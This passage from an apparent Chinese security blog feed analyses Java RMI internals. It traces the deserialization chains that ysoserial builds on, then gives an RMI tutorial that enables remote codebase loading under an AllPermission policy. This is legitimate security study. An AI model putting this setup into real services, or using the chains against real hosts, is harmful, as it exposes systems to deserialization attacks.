是服务端保存的骨架，DGCImpl_Stub 则是保留在远程 Registry 端和客户端的存根。RegistryImpl_Skel 的 dispatch 方法用来处理 RMI 相关的请求，DGCImpl_Skel 的 dispatch 方法同样用于处理 DGC 相关的请求。</p><p>DGCImpl_Skel 的 dispatch 方法，依旧通过 Java 原生的序列化和反序列化来处理对象：</p><img src="/images/QQ_1721654972488.png"><h3 id="RMI-原生反序列化链"><a href="#RMI-原生反序列化链" class="headerlink" title="RMI 原生反序列化链"></a>RMI 原生反序列化链</h3><p>RMI 中的一些类可以用来触发反序列化，在 ysoserial 中就有利用了这些链子的 poc ，所以了解它们的工作流程对于理解 ysoserial 中的代码很有帮助。</p><h4 id="UnicastRemoteObject-类"><a href="#UnicastRemoteObject-类" class="headerlink" title="UnicastRemoteObject 类"></a>UnicastRemoteObject 类</h4><p>java.rmi.server.UnicastRemoteObject 类通常是远程调用接口实现类的父类，如果不作为父类的话，就要直接使用其静态方法 exportObject 来创建动态代理并随机监听本机端口以提供服务。所以 UnicastRemoteObject 会经常被反序列化，调用其 readObject 方法。</p><p>我们来关注 UnicastRemoteObject 的 readObject 方法：</p><img src="/images/QQ_1723145308331.png"><p>这里调用了 UnicastRemoteObject 的 reexport 方法，跟进 reexport 方法看看：</p><img src="/images/QQ_1723145501182.png"><p>可以看到最终还是调用到 UnicastRemoteObject 的 exportObject 方法。在上一篇文章中分析过，这个方法会开启 JRMP 监听。</p><h4 id="UnicastRef-类"><a href="#UnicastRef-类" class="headerlink" title="UnicastRef 类"></a>UnicastRef 类</h4><p>sun.rmi.server.UnicastRef 类实现了 Externalizable 接口，因此在其反序列化时，会调用 readExternal 方法来反序列化。</p><p>UnicastRef 的 readExternal 方法调用 LiveRef 的 read 方法来获取其 ref 属性的值：</p><img src="/images/QQ_1722429509640.png"><p>LiveRef 的 read 方法调用 DGCClient 的 registerRefs 方法：</p><img src="/images/QQ_1722429678813.png"><p>DGCClient 的 registerRefs 方法：</p><img src="/images/QQ_1722429748571.png"><p>var2 是 DGCClient 的内部类 EndpointEntry 的 lookup 方法的返回值，也是 DGCClient 的内部类 EndpointEntry 对象，所以这里调用 DGCClient$EndpointEntry#registerRefs 方法。</p><p>DGCClient$EndpointEntry#registerRefs 方法又继续调用 DGCClient$EndpointEntry#makeDirtyCall 方法：</p><img src="/images/QQ_1722430065789.png"><p>DGCClient$EndpointEntry#makeDirtyCall 方法调用其成员属性 dgc 的 dirty 方法：</p><img src="/images/QQ_1722431232799.png"><p>调试起来发现其实是调用的 DGCImpl_Stub 的 dirty 方法：</p><img src="/images/QQ_1722431161531.png"><h4 id="RemoteObject-类"><a href="#RemoteObject-类" class="headerlink" title="RemoteObject 类"></a>RemoteObject 类</h4><p>RemoteObject 是几乎所有 RMI 远程调用类的父类，它继承了 java.io.Serializable 。但 RemoteObject 是个抽象类，我们通常用到它的子类来进行反序列化，比如 ysoserial 使用 RemoteObjectInvocationHandler 代理类作为反序列化的入口点。</p><p>我们来关注 RemoteObject 的 readObject 方法：</p><img src="/images/image-20240731202114052.png"><p>这里会调用 ref 的 readExternal 方法，那么可以将成员变量 ref 赋值成一个 UnicastRef 对象。</p><p>由于成员变量 ref 被 transient 修饰，不能直接被序列化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transient protected RemoteRef ref;</span><br></pre></td></tr></table></figure><p>所以在 RemoteObject 的序列化处理逻辑中是先获取 ref 的类名再单独序列化，反序列化时再构造内部引用类名并加载相应的类。</p><p>RemoteObject 的 writeObject 方法：</p><img src="/images/QQ_1722429062866.png"><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>本文用来扩展针对 RMI 的攻击思路，大部分真正用到实践上的攻击还是针对 DGC 的攻击，在下一篇文章中我会详细分析 ysoserial 中针对 DGC 的攻击模块。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://su18.org/post/rmi-attack/#2-%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD">Java RMI 攻击由浅入深</a></p><p><a href="https://paper.seebug.org/1091/#java-rmi_3">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;攻击-RMI&quot;&gt;&lt;a href=&quot;#攻击-RMI&quot; class=&quot;headerlink&quot; title=&quot;攻击 RMI&quot;&gt;&lt;/a&gt;攻击 RMI&lt;/h2&gt;&lt;p&gt;前置知识：&lt;a href=&quot;https://changeyourway.github.io/2024/07/</summary>
      
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>基础篇 - RMI 协议详解</title>
    <link href="https://changeyourway.github.io/2024/07/08/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-RMI%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%8D%8F%E8%AE%AE/"/>
    <id>https://changeyourway.github.io/2024/07/08/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-RMI%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E5%8D%8F%E8%AE%AE/</id>
    <published>2024-07-08T08:09:08.067Z</published>
    <updated>2024-07-08T08:11:19.816Z</updated>
    
    <content type="html"><![CDATA[<p>RMI 入门案例及源码分析</p><span id="more"></span><h2 id="RMI-协议介绍"><a href="#RMI-协议介绍" class="headerlink" title="RMI 协议介绍"></a>RMI 协议介绍</h2><p>RMI（Remote Method Invocation，远程方法调用）是 Java 编程语言中用于实现分布式计算的一种技术。RMI 允许一个 JVM上的对象调用另一台 JVM 上的对象的方法，就像调用本地对象的方法一样，从而实现跨网络的远程调用。</p><h2 id="RMI-入门案例"><a href="#RMI-入门案例" class="headerlink" title="RMI 入门案例"></a>RMI 入门案例</h2><p>先来实现一个最简单的 RMI ：服务器会提供一个 sayHello 服务，这个服务有一个方法名为 function ，它的功能是将输入的字符串返回。</p><p>首先我们需要一个接口 SayHelloInterface ，这个接口将会被服务器和客户端共享，Java 的 RMI 规定此接口必须派生自 java.rmi.Remote ，并在每个方法声明抛出 RemoteException ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface SayHelloInterface extends Remote &#123;</span><br><span class="line">    String function(String input) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器需要编写一个接口的实现类 SayHelloImpl ，这个实现类需要实现方法功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public class SayHelloImpl implements SayHelloInterface&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public String function(String input) throws RemoteException &#123;</span><br><span class="line">        return input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，服务端注册这个 RMI 服务，使其开放在公网上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException &#123;</span><br><span class="line">        // 获取服务端代理对象</span><br><span class="line">        SayHelloInterface skeleton = (SayHelloInterface) UnicastRemoteObject.exportObject(new SayHelloImpl(), 0);</span><br><span class="line">        // 创建注册中心，端口为 1099</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        // 将服务端代理对象注册到注册表，服务名为 &quot;SayHello&quot;</span><br><span class="line">        registry.rebind(&quot;SayHello&quot;, skeleton);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端代码至此就完成了。</p><p>接下来是客户端，要想实现远程调用，服务端和客户端需要共享一个接口，所以客户端要将服务端的 SayHelloInterface.java 从服务端复制过来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">public interface SayHelloInterface extends Remote &#123;</span><br><span class="line">    String function(String input) throws RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后在客户端实现 RMI 调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.NotBoundException;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class RMIClientTest &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException, NotBoundException &#123;</span><br><span class="line">        // 连接到服务器 localhost ，端口 1099 :</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</span><br><span class="line">        // 查找名称为 &quot;SayHello&quot; 的服务并强制转型为 SayHelloInterface 类型:</span><br><span class="line">        SayHelloInterface sayHello = (SayHelloInterface) registry.lookup(&quot;SayHello&quot;);</span><br><span class="line">        // 正常调用接口方法:</span><br><span class="line">        String output = sayHello.function(&quot;Hello, RMI&quot;);</span><br><span class="line">        // 打印输出结果</span><br><span class="line">        System.out.println(output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先运行服务器，再运行客户端。运行结果是在客户端控制台上输出：” Hello, RMI “ 。</p><p>除了上面的这种方式以外，RMI 还有另一种实现方式，即服务器在编写接口的实现类时，让这个实现类继承 java.rmi.server.UnicastRemoteObject 类，同时必须为这个实现类提供一个构造函数并且抛出 RemoteException 。那么 SayHelloImpl 实现类可以这样改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class SayHelloImpl extends UnicastRemoteObject implements SayHelloInterface  &#123;</span><br><span class="line">    protected SayHelloImpl() throws RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String function(String input) throws RemoteException &#123;</span><br><span class="line">        return input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时在服务端只需要新建 SayHelloImpl 对象就会自动调用 UnicastRemoteObject 的 exportObject 方法，而不需要再手动调用，服务端 Server 类改成这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line">public class Server &#123;</span><br><span class="line">    public static void main(String[] args) throws RemoteException &#123;</span><br><span class="line">        // 获取服务端代理对象</span><br><span class="line">        SayHelloInterface skeleton = new SayHelloImpl();</span><br><span class="line">        // 将 RMI 服务注册到 1099 端口</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(1099);</span><br><span class="line">        // 将服务端代理对象注册到注册表，服务名为 &quot;SayHello&quot;</span><br><span class="line">        registry.rebind(&quot;SayHello&quot;, skeleton);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是可以正常运行的。</p><p>客户端只有接口，并没有实现类，客户端获得的接口方法返回值实际上是通过网络从服务器端获取的。因为 RMI 服务的默认端口是 1099 ，所以上面的实验也使用 1099 端口。</p><p>Java 的 RMI 严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为 Java 的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证 100% 排除恶意构造的字节码。因此，使用 RMI 时，双方必须是内网互相信任的机器，不要把 1099 端口暴露在公网上作为对外服务。</p><p>此外，Java 的 RMI 调用机制决定了双方必须是 Java 程序，其他语言很难调用 Java 的 RMI 。如果要使用不同语言进行 RPC 调用，可以选择更通用的协议，例如 <a href="https://grpc.io/">gRPC</a> 。</p><h2 id="RMI-原理解析"><a href="#RMI-原理解析" class="headerlink" title="RMI 原理解析"></a>RMI 原理解析</h2><p>RMI 交互图（来自网图）：</p><img src="/images/image-20240611090617906.png"><p>为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信是通过 Stub 和 Skeleton 来实现的。</p><h2 id="RMI-动态类加载"><a href="#RMI-动态类加载" class="headerlink" title="RMI 动态类加载"></a>RMI 动态类加载</h2><p>如果客户端在调用时，传递了一个可序列化对象，这个对象在服务端不存在，则在服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，如果设置了 <code>java.rmi.server.codebase</code>，则会尝试从其中的地址获取 <code>.class</code> 并加载及反序列化。</p><h4 id="什么是-codebase"><a href="#什么是-codebase" class="headerlink" title="什么是 codebase"></a>什么是 codebase</h4><p>codebase 是用于指定 Java RMI（远程方法调用）应用程序中类的字节码位置的属性。这个属性告诉 RMI 服务器和客户端在哪里可以找到所需的类文件。设置 codebase 有助于确保客户端能够动态加载服务器上不存在的类。</p><h4 id="如何开启-RMI-动态类加载"><a href="#如何开启-RMI-动态类加载" class="headerlink" title="如何开启 RMI 动态类加载"></a>如何开启 RMI 动态类加载</h4><h6 id="一、设置-codebase"><a href="#一、设置-codebase" class="headerlink" title="一、设置 codebase"></a>一、设置 codebase</h6><p>有两种办法：</p><ol><li>在代码中使用 System.setProperty 方法可以动态设置 codebase ：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</span><br></pre></td></tr></table></figure><ol start="2"><li>用命令行启动 Java 程序，设置 -Djava.rmi.server.codebase 参数：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot; RMIServer</span><br></pre></td></tr></table></figure><h6 id="二、配置安全策略文件"><a href="#二、配置安全策略文件" class="headerlink" title="二、配置安全策略文件"></a>二、配置安全策略文件</h6><p>例如，policyfile.txt ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个策略文件授予了所有权限，这是最宽松的配置。</p><h6 id="三、启动时指定安全策略文件"><a href="#三、启动时指定安全策略文件" class="headerlink" title="三、启动时指定安全策略文件"></a>三、启动时指定安全策略文件</h6><p>需要设置 java.security.policy ，同样可以用代码和命令行两种方式。</p><ol><li>在代码中使用 System.setProperty 方法可以动态设置 policy：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;policyfile.txt&quot;).toString());</span><br></pre></td></tr></table></figure><ol start="2"><li>用命令行启动 Java 程序，设置 -Djava.security.policy 参数：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djava.security.policy=policyfile.txt -Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot; RemoteServer</span><br></pre></td></tr></table></figure><h2 id="RMI-源码分析"><a href="#RMI-源码分析" class="headerlink" title="RMI 源码分析"></a>RMI 源码分析</h2><p>本次实验 JDK 版本为 8u71 。</p><h4 id="远程对象导出-UnicastRemoteObject-exportObject"><a href="#远程对象导出-UnicastRemoteObject-exportObject" class="headerlink" title="远程对象导出 - UnicastRemoteObject#exportObject"></a>远程对象导出 - UnicastRemoteObject#exportObject</h4><p>如果服务端的实现类继承了 UnicastRemoteObject ，那么在实例化获取服务端代理对象的时候，会调用 UnicastRemoteObject 的构造方法，无参构造调用有参构造，最终会调用 UnicastRemoteObject 的 exportObject 方法：</p><img src="/images/image-20240612110437282.png"><p>如果服务端的实现类没有继承 UnicastRemoteObject ，则需要手动调用 UnicastRemoteObject 的 exportObject 方法。那么这个 exportObject 方法到底实现了什么功能呢？</p><p>跟进 exportObject 方法：</p><img src="/images/image-20240612111357495.png"><p>跟进后发现它又调用了另一个 exportObject 方法，继续跟进：</p><img src="/images/image-20240612111453130.png"><p>这里调用了 sref 的 exportObject 方法，sref 是一个 UnicastServerRef 对象。</p><p>继续跟进 UnicastServerRef 的 exportObject 方法：</p><img src="/images/image-20240612111906524.png"><p>这其中使用 sun.rmi.server.Util#createProxy() 方法创建了一个代理对象，且最终返回的就是这个代理对象。</p><p>继续跟进 Util 的 createProxy() 方法：</p><img src="/images/image-20240612112048849.png"><p>可以看到，这里用 RemoteObjectInvocationHandler 创建了一个代理对象。</p><p>接下来回到 exportObject 方法：</p><img src="/images/image-20240612160346393.png"><p>然后会新建一个 Target 对象，这个 Target 对象中封装了返回的代理对象 var5 。之后调用 this.ref 的 exportObject 方法，并将这个 Target 对象传入。</p><p>this.ref 是一个 LiveRef 对象，我们跟进它的 exportObject 方法：</p><img src="/images/image-20240612161232621.png"><p>这里又调用 this.ep 的 exportObject 方法，当程序运行起来时，会发现 this.ep 实际上是一个 TCPEndpoint 对象：</p><img src="/images/image-20240612161839874.png"><p>于是跟进 TCPEndpoint 的 exportObject 方法：</p><img src="/images/image-20240612161958983.png"><p>发现它又调用 TCPTransport 的 exportObject 方法。</p><p>继续跟进 TCPTransport 的 exportObject 方法：</p><img src="/images/image-20240612162513179.png"><p>TCPTransport 的 exportObject 方法其实干了两件事，一是调用它自己的 listen() 方法开启监听，二是调用它父类 Transport 的 exportObject 方法。</p><p>TCPTransport 的 listen() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">private void listen() throws RemoteException &#123;</span><br><span class="line">    assert Thread.holdsLock(this);</span><br><span class="line"></span><br><span class="line">    TCPEndpoint var1 = this.getEndpoint();</span><br><span class="line">    int var2 = var1.getPort();</span><br><span class="line">    if (this.server == null) &#123;</span><br><span class="line">        if (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            tcpLog.log(Log.BRIEF, &quot;(port &quot; + var2 + &quot;) create server socket&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            this.server = var1.newServerSocket();</span><br><span class="line">            Thread var3 = (Thread)AccessController.doPrivileged(new NewThreadAction(new AcceptLoop(this.server), &quot;TCP Accept-&quot; + var2, true));</span><br><span class="line">            var3.start();</span><br><span class="line">        &#125; catch (BindException var4) &#123;</span><br><span class="line">            throw new ExportException(&quot;Port already in use: &quot; + var2, var4);</span><br><span class="line">        &#125; catch (IOException var5) &#123;</span><br><span class="line">            throw new ExportException(&quot;Listen failed on port: &quot; + var2, var5);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        SecurityManager var6 = System.getSecurityManager();</span><br><span class="line">        if (var6 != null) &#123;</span><br><span class="line">            var6.checkListen(var2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法实现了一个用于监听 TCP 连接的功能。它首先检查当前线程是否持有对象锁，并获取端点的端口号。如果服务器套接字尚未创建，它会创建一个新的服务器套接字并启动一个新的线程进行接受循环（AcceptLoop），以处理传入连接；如果端口已被占用，则抛出 BindException ，否则抛出 IOException 。如果服务器套接字已经存在，则检查当前安全管理器并验证监听权限。</p><p>Transport 的 exportObject 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void exportObject(Target var1) throws RemoteException &#123;</span><br><span class="line">    var1.setExportedTransport(this);</span><br><span class="line">    ObjectTable.putTarget(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调用了两个方法，其中 var1.setExportedTransport 只是做了一个简单的赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void setExportedTransport(Transport var1) &#123;</span><br><span class="line">    if (this.exportedTransport == null) &#123;</span><br><span class="line">        this.exportedTransport = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ObjectTable 的 putTarget 方法则是将一个远程对象（目标对象 Target ）添加到对象表和实现表中，以便进行远程方法调用和垃圾回收管理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static void putTarget(Target var0) throws ExportException &#123;</span><br><span class="line">    ObjectEndpoint var1 = var0.getObjectEndpoint();</span><br><span class="line">    WeakRef var2 = var0.getWeakImpl();</span><br><span class="line">    if (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        DGCImpl.dgcLog.log(Log.VERBOSE, &quot;add object &quot; + var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    synchronized(tableLock) &#123;</span><br><span class="line">        if (var0.getImpl() != null) &#123;</span><br><span class="line">            if (objTable.containsKey(var1)) &#123;</span><br><span class="line">                throw new ExportException(&quot;internal error: ObjID already in use&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (implTable.containsKey(var2)) &#123;</span><br><span class="line">                throw new ExportException(&quot;object already exported&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            objTable.put(var1, var0);</span><br><span class="line">            implTable.put(var2, var0);</span><br><span class="line">            if (!var0.isPermanent()) &#123;</span><br><span class="line">                incrementKeepAliveCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总之，ObjectTable 的 putTarget 方法负责管理远程对象的导出和注册，以支持远程调用，并确保对象不被重复导出或使用相同的对象标识符。</p><p>那么总结一下：UnicastRemoteObject 的 exportObject 方法经过一系列调用后最终开启了监听（默认参数是 0 ，表示系统将选择一个空闲的端口来进行监听，而不是指定一个固定的端口），以及将传入的目标对象导出到对象表和实现表，并返回一个代理对象。</p><h6 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">UnicastRemoteObject#exportObject(Remote, UnicastServerRef)</span><br><span class="line">UnicastServerRef#exportObject(Remote, Object, boolean)</span><br><span class="line">-&gt; Util#createProxy(Class&lt;?&gt;, RemoteRef, boolean) // 创建代理对象</span><br><span class="line">-&gt; LiveRef#exportObject(Target)</span><br><span class="line">   TCPEndpoint#exportObject(Target)</span><br><span class="line">   TCPTransport#exportObject(Target)</span><br><span class="line">       -&gt; TCPTransport#listen()// 开启监听</span><br><span class="line">       -&gt; Transport#exportObject(Target)</span><br><span class="line">          ObjectTable#putTarget(Target)// 远程对象导出</span><br></pre></td></tr></table></figure><h4 id="动态代理创建-RemoteObjectInvocationHandler-invoke"><a href="#动态代理创建-RemoteObjectInvocationHandler-invoke" class="headerlink" title="动态代理创建 - RemoteObjectInvocationHandler#invoke"></a>动态代理创建 - RemoteObjectInvocationHandler#invoke</h4><p>前面 Util.createProxy() 方法在创建代理对象的时候就用到了 RemoteObjectInvocationHandler 这个类，那么当代理对象的任意方法被调用，RemoteObjectInvocationHandler 的 invoke 方法就会被调用。</p><p>RemoteObjectInvocationHandler 的 invoke 方法：</p><img src="/images/image-20240612172302872.png"><p>如果代理对象调用的方法是从 Object 类继承的方法，那么将会调用 invokeObjectMethod 方法；如果方法名是 finalize 且参数数量为 0，并且 allowFinalizeInvocation 标志为 false ，那么返回 null，表示忽略 finalize 方法的调用；对于其他方法，则调用 invokeRemoteMethod 方法来处理。</p><p>接着来看 RemoteObjectInvocationHandler 的 invokeRemoteMethod 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">private Object invokeRemoteMethod(Object proxy,</span><br><span class="line">                                  Method method,</span><br><span class="line">                                  Object[] args)</span><br><span class="line">    throws Exception</span><br><span class="line">&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        if (!(proxy instanceof Remote)) &#123;</span><br><span class="line">            throw new IllegalArgumentException(</span><br><span class="line">                &quot;proxy not Remote instance&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        // 实际处理逻辑</span><br><span class="line">        return ref.invoke((Remote) proxy, method, args,</span><br><span 